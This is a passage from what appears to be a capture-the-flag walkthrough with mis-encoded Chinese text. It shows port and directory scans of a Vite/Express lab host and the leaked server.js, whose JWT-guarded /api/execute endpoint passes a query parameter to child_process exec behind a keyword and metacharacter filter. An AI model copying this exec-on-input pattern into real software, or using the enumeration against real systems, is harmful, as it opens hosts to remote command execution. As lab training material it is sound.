SF:tRequest,FE,'HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
SF:t-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x20May\x202025\x2014:16:15
SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20
SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2
SF:0host,\x20add\x20undefined\x20to\x20`server\.allowedHosts`\x20in\x20vit
SF:e\.config\.js\.')%r(Help,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
SF:')%r(NCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(HTTPOptions
SF:,D2,'HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,
SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x20May
SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n')%r(RTSPReq
SF:uest,D2,'HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,
SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x2
SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n')%r(RPC
SF:Check,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(DNSVersionBind
SF:ReqTCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(DNSStatusRequ
SF:estTCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(SSLSessionReq
SF:,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(TerminalServerCooki
SF:e,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(TLSSessionReq,1C,'
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(Kerberos,1C,'HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n')%r(SMBProgNeg,1C,'HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\n\r\n')%r(X11Probe,1C,'HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n')%r(FourOhFourRequest,FE,'HTTP/1\.1\x20403\x20Forbidden\r\n
SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x
SF:20May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked
SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed\
SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20`server\.a
SF:llowedHosts`\x20in\x20vite\.config\.js\.');
MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

åªå¼€æ”¾äº†`3000`å£ï¼Œå°è¯•è®¿é—®ä¸€ä¸‹ï¼Œä¸€ä¸ªç¤ºä¾‹é¡µé¢ï¼Œè®²è¿°å¦‚ä½•åˆ›å»ºä¸€ä¸ª` Vue.js + Express.js `çš„å‰åç«¯åˆ†ç¦»é¡¹ç›®,`vue.js`çš„æ–°æ‰‹æŒ‡å—

### ç›®å½•æ‰«æ

```shell
â””â”€# dirsearch -u http://$IP:3000  -x 403 -e txt,php,html
[22:16:55] 200 -  302B  - /.flac
[22:16:55] 200 -  301B  - /.gif
[22:16:55] 200 -  301B  - /.ico
[22:16:55] 200 -  302B  - /.jpeg
[22:16:55] 200 -  301B  - /.jpg
[22:16:56] 200 -  301B  - /.mp3
[22:16:56] 200 -  301B  - /.pdf
[22:16:56] 200 -  301B  - /.png
[22:16:57] 200 -  301B  - /.txt
[22:17:07] 404 -    0B  - /favicon.ico
[22:17:13] 200 -  385B  - /README.md
[22:17:14] 200 -   21KB - /server
[22:17:14] 200 -   21KB - /server.js
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html --exclude-length 414
/.txt                 (Status: 200) [Size: 301]
/server               (Status: 200) [Size: 21764]
/sign                 (Status: 200) [Size: 189]
/execute              (Status: 401) [Size: 48]
/.txt                 (Status: 200) [Size: 301]
```

`gobuster`å¯ä»¥å‘ç°å‡ ä¸ªæœ‰ç”¨çš„è·¯å¾„`/executeã€/signã€/server.js`æŒ¨ä¸ªè¯·æ±‚ä¸€ä¸‹çœ‹çœ‹

```
â””â”€# curl http://$IP:3000/sign
{'status':'signed','data':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0'}

â””â”€# curl http://$IP:3000/execute
{'status':'rejected','data':'permission denied'}

â””â”€# curl http://$IP:3000/server.js
import __vite__cjsImport0_express from '/node_modules/.vite/deps/express.js?v=8bc9628c'; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
import __vite__cjsImport1_jsonwebtoken from '/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c'; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
import '/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c'
import __vite__cjsImport3_child_process from '/@id/__vite-browser-external:child_process'; const exec = __vite__cjsImport3_child_process['exec'];
import __vite__cjsImport4_util from '/@id/__vite-browser-external:util'; const promisify = __vite__cjsImport4_util['promisify'];

const app = express();

const address = 'localhost';
const port = 3001;

const exec_promise = promisify(exec);

const COMMAND_FILTER = process.env.COMMAND_FILTER
    ? process.env.COMMAND_FILTER.split(',')
        .map(cmd =&gt; cmd.trim().toLowerCase())
        .filter(cmd =&gt; cmd !== '')
    : [];

app.use(express.json());

function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') {
        return false;
    }
    if (COMMAND_FILTER.length === 0) {
        return false;
    }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&amp;')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&amp;')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }
    }

    if (/[;&amp;|]/.test(cmd)) {
        return false;
    }
    if (/[&lt;&gt;]/.test(cmd)) {
        return false;
    }
    if (/[`$()]/.test(cmd)) {
        return false;
    }

    return true;
}

async function execute_command_sync(command) {
    try {
        const { stdout, stderr } = await exec_promise(command);

        if (stderr) {
            return { status: false, data: { stdout, stderr } };
        }
        return { status: true, data: { stdout, stderr } };
    } catch (error) {
        return { status: true, data: error.message };
    }
}

app.get('/', (req, res) =&gt; {
    return res.json({
        'status': 'working',
        'data': `listening on http://${address}:${port}`
    })
})

app.get('/api/sign', (req, res) =&gt; {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) =&gt; {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({
            'status': 'rejected',
            'data': 'permission denied'
        });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({
                'status': 'rejected',
                'data': 'permission denied'
            });
        }
    } catch (err) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `permission denied`
        });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `this command is unsafe`
        });
    }

    const result = await execute_command_sync(command);

    return res.json({
        'status': result.status === true ? 'executed' : 'failed',
        'data': result.data
    })
});

app.listen(port, address, () =&gt; {
    console.log(`Listening on http://${address}:${port}`)
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNlcnZlci5qcyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgX192aXRlX19janNJbXBvcnQwX2V4cHJlc3MgZnJvbSBcIi9ub2RlX21vZHVsZXMvLnZpdGUvZGVwcy9leHByZXNzLmpzP3Y9OGJjOTYyOGNcIjsgY29uc3QgZXhwcmVzcyA9IF9fdml0ZV9fY2pzSW1wb3J0MF9leHByZXNzLl9fZXNNb2R1bGUgPyBfX3ZpdGVfX2Nqc0ltcG9ydDBfZXhwcmVzcy5kZWZhdWx0IDogX192aXRlX19janNJbXBvcnQwX2V4cHJlc3M7XG5pbXBvcnQgX192aXRlX19janNJbXBvcnQxX2pzb253ZWJ0b2tlbiBmcm9tIFwiL25vZGVfbW9kdWxlcy8udml0ZS9kZXBzL2pzb253ZWJ0b2tlbi5qcz92PThiYzk2MjhjXCI7IGNvbnN0IGp3dCA9IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW4uX19lc01vZHVsZSA/IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW4uZGVmYXVsdCA6IF9fdml0ZV9fY2pzSW1wb3J0MV9qc29ud2VidG9rZW47XG5pbXBvcnQgXCIvbm9kZV9tb2R1bGVzLy52aXRlL2RlcHMvZG90ZW52X2NvbmZpZy5qcz92PThiYzk2MjhjXCJcbmltcG9ydCBfX3ZpdGVfX2Nqc0ltcG9ydDNfY2hpbGRfcHJvY2VzcyBmcm9tIFwiL0BpZC9fX3ZpdGUtYnJvd3Nlci1leHRlcm5hbDpjaGlsZF9wcm9jZXNzXCI7IGNvbnN0IGV4ZWMgPSBfX3ZpdGVfX2Nqc0ltcG9ydDNfY2hpbGRfcHJvY2Vzc1tcImV4ZWNcIl07XG5pbXBvcnQgX192aXRlX19janNJbXBvcnQ0X3V0aWwgZnJvbSBcIi9AaWQvX192aXRlLWJyb3dzZXItZXh0ZXJuYWw6dXRpbFwiOyBjb25zdCBwcm9taXNpZnkgPSBfX3ZpdGVfX2Nqc0ltcG9ydDRfdXRpbFtcInByb21pc2lmeVwiXTtcblxuY29uc3QgYXBwID0gZXhwcmVzcygpO1xuXG5jb25zdCBhZGRyZXNzID0gJ2xvY2FsaG9zdCc7XG5jb25zdCBwb3J0ID0gMzAwMTtcblxuY29uc3QgZXhlY19wcm9taXNlID0gcHJvbWlzaWZ5KGV4ZWMpO1xuXG5jb25zdCBDT01NQU5EX0ZJTFRFUiA9IHByb2Nlc3MuZW52LkNPTU1BTkRfRklMVEVSXG4gICAgPyBwcm9jZXNzLmVudi5DT01NQU5EX0ZJTFRFUi5zcGxpdCgnLCcpXG4gICAgICAgIC5tYXAoY21kID0+IGNtZC50cmltKCkudG9Mb3dlckNhc2UoKSlcbiAgICAgICAgLmZpbHRlcihjbWQgPT4gY21kICE9PSAnJylcbiAgICA6IFtdO1xuXG5hcHAudXNlKGV4cHJlc3MuanNvbigpKTtcblxuZnVuY3Rpb24gaXNfc2FmZV9jb21tYW5kKGNtZCkge1xuICAgIGlmICghY21kIHx8IHR5cGVvZiBjbWQgIT09ICdzdHJpbmcnKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgaWYgKENPTU1BTkRfRklMVEVSLmxlbmd0aCA9PT0gMCkge1xuICAgICAgICByZXR1cm4gZmFsc2U7XG4gICAgfVxuXG4gICAgY29uc3QgbG93ZXJfY21kID0gY21kLnRvTG93ZXJDYXNlKCk7XG5cbiAgICBmb3IgKGNvbnN0IGZvcmJpZGRlbiBvZiBDT01NQU5EX0ZJTFRFUikge1xuICAgICAgICBjb25zdCByZWdleCA9IG5ldyBSZWdFeHAoYFxcXFxiJHtmb3JiaWRkZW4ucmVwbGFjZSgvWy4qKz9eJHt9KCl8W1xcXVxcXFxdL2csICdcXFxcJCYnKX1cXFxcYnxeJHtmb3JiaWRkZW4ucmVwbGFjZSgvWy4qKz9eJHt9KCl8W1xcXVxcXFxdL2csICdcXFxcJCYnKX0kYCwgJ2knKTtcbiAgICAgICAgaWYgKHJlZ2V4LnRlc3QobG93ZXJfY21kKSkge1xuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgaWYgKC9bOyZ8XS8udGVzdChjbWQpKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgaWYgKC9bPD5dLy50ZXN0KGNtZCkpIHtcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgIH1cbiAgICBpZiAoL1tgJCgpXS8udGVzdChjbWQpKSB7XG4gICAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG5cbiAgICByZXR1cm4gdHJ1ZTtcbn1cblxuYXN5bmMgZnVuY3Rpb24gZXhlY3V0ZV9jb21tYW5kX3N5bmMoY29tbWFuZCkge1xuICAgIHRyeSB7XG4gICAgICAgIGNvbnN0IHsgc3Rkb3V0LCBzdGRlcnIgfSA9IGF3YWl0IGV4ZWNfcHJvbWlzZShjb21tYW5kKTtcblxuICAgICAgICBpZiAoc3RkZXJyKSB7XG4gICAgICAgICAgICByZXR1cm4geyBzdGF0dXM6IGZhbHNlLCBkYXRhOiB7IHN0ZG91dCwgc3RkZXJyIH0gfTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4geyBzdGF0dXM6IHRydWUsIGRhdGE6IHsgc3Rkb3V0LCBzdGRlcnIgfSB9O1xuICAgIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgICAgIHJldHVybiB7IHN0YXR1czogdHJ1ZSwgZGF0YTogZXJyb3IubWVzc2FnZSB9O1xuICAgIH1cbn1cblxuYXBwLmdldCgnLycsIChyZXEsIHJlcykgPT4ge1xuICAgIHJldHVybiByZXMuanNvbih7XG4gICAgICAgICdzdGF0dXMnOiAnd29ya2luZycsXG4gICAgICAgICdkYXRhJzogYGxpc3RlbmluZyBvbiBodHRwOi8vJHthZGRyZXNzfToke3BvcnR9YFxuICAgIH0pXG59KVxuXG5hcHAuZ2V0KCcvYXBpL3NpZ24nLCAocmVxLCByZXMpID0+IHtcbiAgICByZXR1cm4gcmVzLmpzb24oe1xuICAgICAgICAnc3RhdHVzJzogJ3NpZ25lZCcsXG4gICAgICAgICdkYXRhJzogand0LnNpZ24oe1xuICAgICAgICAgICAgdWlkOiAtMSxcbiAgICAgICAgICAgIHJvbGU6ICdndWVzdCcsXG4gICAgICAgIH0sIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQsIHsgZXhwaXJlc0luOiAnMTgwMHMnIH0pLFxuICAgIH0pO1xufSk7XG5cbmFwcC5nZXQoJy9hcGkvZXhlY3V0ZScsIGFzeW5jIChyZXEsIHJlcykgPT4ge1xuICAgIGNvbnN0IGF1dGhvcml6YXRpb25faGVhZGVyX3JhdyA9IHJlcS5oZWFkZXJzWydhdXRob3JpemF0aW9uJ107XG4gICAgaWYgKCFhdXRob3JpemF0aW9uX2hlYWRlcl9yYXcgfHwgIWF1dGhvcml6YXRpb25faGVhZGVyX3Jhdy5zdGFydHNXaXRoKCdCZWFyZXIgJykpIHtcbiAgICAgICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAxKS5qc29uKHtcbiAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgJ2RhdGEnOiAncGVybWlzc2lvbiBkZW5pZWQnXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IGp3dF9yYXcgPSBhdXRob3JpemF0aW9uX2hlYWRlcl9yYXcuc3BsaXQoJyAnKVsxXTtcblxuICAgIHRyeSB7XG4gICAgICAgIGNvbnN0IHBheWxvYWQgPSBqd3QudmVyaWZ5KGp3dF9yYXcsIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQpO1xuICAgICAgICBpZiAocGF5bG9hZC5yb2xlICE9PSAnYWRtaW4nKSB7XG4gICAgICAgICAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmpzb24oe1xuICAgICAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgICAgICdkYXRhJzogJ3Blcm1pc3Npb24gZGVuaWVkJ1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9IGNhdGNoIChlcnIpIHtcbiAgICAgICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAxKS5qc29uKHtcbiAgICAgICAgICAgICdzdGF0dXMnOiAncmVqZWN0ZWQnLFxuICAgICAgICAgICAgJ2RhdGEnOiBgcGVybWlzc2lvbiBkZW5pZWRgXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IGNvbW1hbmQgPSByZXEucXVlcnkuY21kO1xuXG4gICAgY29uc3QgaXNfY29tbWFuZF9zYWZlID0gaXNfc2FmZV9jb21tYW5kKGNvbW1hbmQpO1xuICAgIGlmICghaXNfY29tbWFuZF9zYWZlKSB7XG4gICAgICAgIHJldHVybiByZXMuc3RhdHVzKDQwMSkuanNvbih7XG4gICAgICAgICAgICAnc3RhdHVzJzogJ3JlamVjdGVkJyxcbiAgICAgICAgICAgICdkYXRhJzogYHRoaXMgY29tbWFuZCBpcyB1bnNhZmVgXG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IGV4ZWN1dGVfY29tbWFuZF9zeW5jKGNvbW1hbmQpO1xuXG4gICAgcmV0dXJuIHJlcy5qc29uKHtcbiAgICAgICAgJ3N0YXR1cyc6IHJlc3VsdC5zdGF0dXMgPT09IHRydWUgPyAnZXhlY3V0ZWQnIDogJ2ZhaWxlZCcsXG4gICAgICAgICdkYXRhJzogcmVzdWx0LmRhdGFcbiAgICB9KVxufSk7XG5cbmFwcC5saXN0ZW4ocG9ydCwgYWRkcmVzcywgKCkgPT4ge1xuICAgIGNvbnNvbGUubG9nKGBMaXN0ZW5pbmcgb24gaHR0cDovLyR7YWRkcmVzc306JHtwb3J0fWApXG59KTtcbiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsMEJBQTBCLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxZQUFZLENBQUMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsMEJBQTBCLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQywwQkFBMEIsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLDBCQUEwQjtBQUNoTixNQUFNLENBQUMsK0JBQStCLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxZQUFZLENBQUMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsK0JBQStCLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQywrQkFBK0IsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLCtCQUErQjtBQUNyTyxNQUFNLENBQUMsQ0FBQyxDQUFDLFlBQVksQ0FBQyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsUUFBUTtBQUM1RCxNQUFNLENBQUMsZ0NBQWdDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLFFBQVEsQ0FBQyxhQUFhLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLGdDQUFnQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUM7QUFDaEosTUFBTSxDQUFDLHVCQUF1QixDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyx1QkFBdUIsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxDQUFDOztBQUUvSCxLQUFLLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUMsQ0FBQzs7QUFFckIsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUM7QUFDM0IsS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsSUFBSTs7QUFFakIsS0FBSyxDQUFDLFlBQVksQ0FBQyxDQUFDLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQzs7QUFFcEMsS0FBSyxDQUFDLGNBQWMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLEdBQUcsQ0FBQztBQUNuQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLGNBQWMsQ0FBQyxLQUFLLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDMUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxXQUFXLENBQUMsQ0FBQztBQUM1QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNqQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRVIsR0FBRyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQzs7QUFFdkIsUUFBUSxDQUFDLGVBQWUsQ0FBQyxHQUFHLENBQUMsQ0FBQztBQUM5QixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUM7QUFDekMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxLQUFLO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDSixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLGNBQWMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNyQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxXQUFXLENBQUMsQ0FBQzs7QUFFdkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxLQUFLLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxjQUFjLENBQUMsQ0FBQztBQUM1QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ3hKLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUM7QUFDbkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDeEIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ1IsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztBQUMzQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNKLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztBQUMxQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUs7QUFDcEIsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNKLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUM7QUFDNUIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxLQUFLO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRUosQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsSUFBSTtBQUNmOztBQUVBLEtBQUssQ0FBQyxRQUFRLENBQUMsb0JBQW9CLENBQUMsT0FBTyxDQUFDLENBQUM7QUFDN0MsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsWUFBWSxDQUFDLE9BQU8sQ0FBQzs7QUFFOUQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUM5RCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUF